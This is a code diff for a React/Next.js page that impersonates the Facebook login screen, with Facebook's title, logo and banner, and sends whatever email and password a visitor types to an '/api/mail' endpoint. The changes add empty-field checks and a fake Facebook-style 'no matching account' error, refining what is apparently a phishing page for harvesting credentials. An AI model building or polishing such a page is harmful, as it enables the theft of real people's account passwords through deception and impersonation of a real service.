@@ -5,13 +5,15 @@ import { useState } from "react";
 import { Helmet } from 'react-helmet';
 import apps from '../public/apps.jpg';
 import image from '../public/facebook.svg';
+import logo from '../public/Facebook_f_logo.svg';
 
 export default function Home(){
     const router = useRouter()
     const [email,setEmail] = useState('')
     const [password,setPassword] = useState('')
-    const [type,setType] = useState('password');
-    const [hide,setHide] = useState(true);
+    const [type,setType] = useState('password')
+    const [hide,setHide] = useState(true)
+    const [error,setError] = useState(false)
 
     const handleHide=()=>{
         if(type === 'password'){
@@ -24,6 +26,9 @@ export default function Home(){
     }
 
     const sendMail=async()=>{
+        if(!email || !password){
+            return setError(!error)
+        }
         try {
             const res = await axios.post('/api/mail',{
                 email,password
@@ -41,12 +46,19 @@ export default function Home(){
             <Helmet>
                 <title>Facebook - Login or signup account</title>
                 <meta name="theme-color" content='#3b5999' />
+                <meta property="og:image" content={logo}></meta>
             </Helmet>
             <div>
-                <div className="px-4 py-2 flex items-center bg-[#fffbe2] space-x-3">
-                    <Image src={apps} alt="account" height={30} width={18}/>
-                    <span className="text-blue-700 text-sm">Get Facebook Lite and browse faster</span>
-                </div>
+                {error ?
+                    <div className="px-4 py-2 bg-red-500 text-white text-xs">
+                        The email address orphone number that you have entered doesnot match any account.Signup for new account.
+                    </div>
+                    :
+                    <div className="px-4 py-2 flex items-center bg-[#fffbe2] space-x-3">
+                        <Image src={apps} alt="account" height={30} width={18}/>
+                        <span className="text-blue-700 text-sm">Get Facebook Lite and browse faster</span>
+                    </div>
+                }
                 <div className="px-4">
                     <div className=" w-full flex justify-center py-2">
                         <Image 
